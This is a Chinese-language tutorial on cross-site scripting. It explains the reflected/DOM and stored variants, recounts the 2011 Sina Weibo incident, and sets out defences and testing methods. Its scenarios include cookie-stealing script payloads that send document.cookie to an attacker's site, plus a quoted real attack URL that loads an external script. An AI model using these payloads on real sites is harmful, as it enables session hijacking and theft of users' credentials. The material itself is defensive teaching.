##WEB安全-XSS攻击

###一、背景知识

1、什么是XSS攻击？

XSS攻击：跨站脚本攻击（Cross Site Scripting），为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆。故将跨站脚本攻击缩写为XSS。跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者在网页中嵌入恶意代码(例如JavaScript)，当其它用户浏览该网站时，这段代码会自动执行，从而达到攻击的目的。比如这些代码包括HTML代码和客户端脚本。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的"缓冲区溢出攻击"，而JavaScript是新型的"ShellCode"。

XSS并不限于可见的页面输入，还有可能是隐藏表单域、get请求参数等。

2、XSS攻击的危害：

盗取用户 Cookie、破坏页面结构、导航到恶意网站、获取浏览器信息、携带木马等。

###二、XSS漏洞的分类

XSS漏洞按照攻击利用手法的不同，有以下三种类型：

　　XSS攻击类似于SQL注 入攻击，攻击之前，我们先找到一个存在XSS漏洞的网站，XSS漏洞分为两种，一种是DOM Based XSS漏洞，另一种是Stored XSS漏洞。理论上，所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于 script。

1、DOM Based XSS

DOM Based XSS是一种基于网页DOM结构的攻击，该攻击特点是中招的人是少数人。

场景一：

当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似：

```html
<%@ page language="java"contentType="text/html; charset=UTF-8"pageEncoding="UTF-8"%>
<!DOCTYPEhtmlPUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN""http://www.w3.org/TR/html4/loose.dtd">
<html>
    <head>
        <title>XSS测试</title>
    </head>
    <body>
        页面内容：<%=request.getParameter("content")%>
    </body>
</html>
```
我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址 为：http ://www.a.com?content= &lt;script&gt; window.open(“www.b.com?param=”+document.cookie)&lt;/script&gt;，当Tom点击这个链 接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我 搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！这个过程中， 受害者只有Tom自己。那当我在浏览器输入a.com?content=&lt;script&gt;alert(“xss”)&lt;/script&gt;，浏览器展示页面内容的过程中，就会执行我的脚本，页面输出xss字样，这是攻击了我自己，那我如何攻击别人并且获利呢？

2、Stored XSS

Stored XSS是存储式XSS漏洞，由于其攻击代码已经存储到服务器上或者数据库中，，比如发布一篇文章包含恶意代码，其他用户浏览时将执行恶意脚本，所以受害者是很多人。

场景二：

a.com可以发文章， 我登录后在a.com中发布了一篇文章，文章中包含了恶意代 码，&lt;script&gt;window.open(“www.b.com?param=”+document.cookie)&lt; /script&gt;，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务 器上，攻击成功！这个过程中，受害者是多个人。
Stored XSS漏洞危害性更大，危害面更广。

3、攻击事例
2011年新浪微博的XSS攻击就是存储式XSS漏洞攻击，主要是通过未过滤处理的URL中的参数来加载攻击者已写好的脚本，并且使用短链服务将URL伪装，然后通过诱人的话题欺骗用户访问该链接后在浏览器运行，达到攻击的目的。如将http ://163.fm/PxZHoxn指向 http ://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update。所以我们应该严防短链接。

三、XSS防御

我们是在一个矛盾的世界中，有矛就有盾。只要我们的代码中不存在漏洞，攻击者就无从下手，我们要做一个没有缝的蛋。

XSS 漏洞修复

>原则： 不相信客户输入的数据
>注意： 攻击代码不一定在&lt;script&gt;&lt;/script&gt;中将重要的cookie标记为http only,这样的话 Javascript 中的 document.cookie 语句就不能获取到 cookie 了.需要对用户的输入进行处理，只允许用户输入我们期望的数据，其它值一概过滤掉。例如：　年龄的textbox中，只允许用户输入数字。 而数字之外的字符都过滤掉。对数据进行Html Encode 处理过滤或移除特殊的Html标签， 例如: &lt;script&gt;, &lt;iframe&gt; ,  &lt; for <, &gt; for >, &quot; for过滤 JavaScript 事件的标签。例如 "onclick=", "onfocus" 等等。

XSS具体的防御有如下方式：

1. 输入校验
对用户的所有输入数据进行检测，比如过滤其中的“<”、“>”、“/”、双引号等可能导致脚本注入的特殊字符，或者过滤“script”、 “javascript”等脚本关键字，或者对输入数据的长度及格式进行限制等等。同时，我们也要考虑用户可能绕开ASCII码，使用十六进制编码如 “<”/span“>”（“<”）、“>”（“>”）等来输入脚本。因此，对用户输入的十六进制编码，我们也要进行相应的过滤。只要开发人员能够严格检测每一处交互点，保证对所有用户可能的输入都进行检测和XSS过滤，就能够有效地阻止XSS攻击。

2. 输出编码
通过前面对XSS攻击的分析，我们可以看到，之所以会产生XSS攻击，就是因为Web应用程序将用户的输入直接嵌入到某个页面当中，作为该页面的 HTML代 码的一部分。因此，当Web应用程序将用户的输入数据输出到目标页面中时，只要先对这些数据进行编码，然后再输出到目标页面中。这样，如果用户输入一些 HTML的脚本，也会被当成普通的文字，而不会成为目标页面HTML代码的一部分得到执行。

3. 严防外部的Javascript
外部的Javascript一旦引入了，这些脚本就能够操纵你的HTML页面，窃取敏感信息或者发起钓鱼攻击等等。

四、如何测试XSS漏洞

方法一：查看代码，查找关键的变量,   客户端将数据传送给Web 服务端一般通过三种方式 Querystring, Form表单，以及cookie.  例如在ASP的程序中，通过Request对象获取客户端的变量
```c#
<%
strUserCode =  Request.QueryString(“code”);
strUser =  Request.Form(“USER”);
strID =    Request.Cookies(“ID”);
%>
```
假如变量没有经过htmlEncode处理， 那么这个变量就存在一个XSS漏洞

方法二：　准备测试脚本

    <script>alert(document.cookie)</script>
    "onclick="alert(document.cookie)"

在网页中的Textbox或者其他能输入数据的地方，输入这些测试脚本， 看能不能弹出对话框，能弹出的话说明存在XSS漏洞在URL中查看有那些变量通过URL把值传给Web服务器， 把这些变量的值退换成我们的测试的脚本。  然后看我们的脚本是否能执行

方法三:  自动化测试XSS漏洞

现在已经有很多XSS扫描工具了。 实现XSS自动化测试非常简单，只需要用HttpWebRequest类。 把包含xss 测试脚本。发送给Web服务器。 然后查看HttpWebResponse中，我们的XSS测试脚本是否已经注入进去了。

五、HTML Encode

XSS之所以会发生， 是因为用户输入的数据变成了代码。 所以我们需要对用户输入的数据进行HTML Encode处理。 将其中的"中括号"， “单引号”，“引号” 之类的特殊字符进行编码。在C#中已经提供了现成的方法，只要调用HttpUtility.HtmlEncode("string &lt;scritp&gt;") 就可以了。  （需要引用System.Web程序集）

六、浏览器中的XSS过滤器

为了防止发生XSS， 很多浏览器厂商都在浏览器中加入安全机制来过滤XSS。 例如IE8，IE9，Firefox, Chrome. 都有针对XSS的安全机制。 浏览器会阻止XSS。 

如果需要做测试， 最好使用IE7。

Chrome可以过滤反射型XSS，原因是webkit的一个模块,而非chrome,所以Safari和360安全浏览器极速模式等webkit内核的浏览器都有XSS过滤功能.
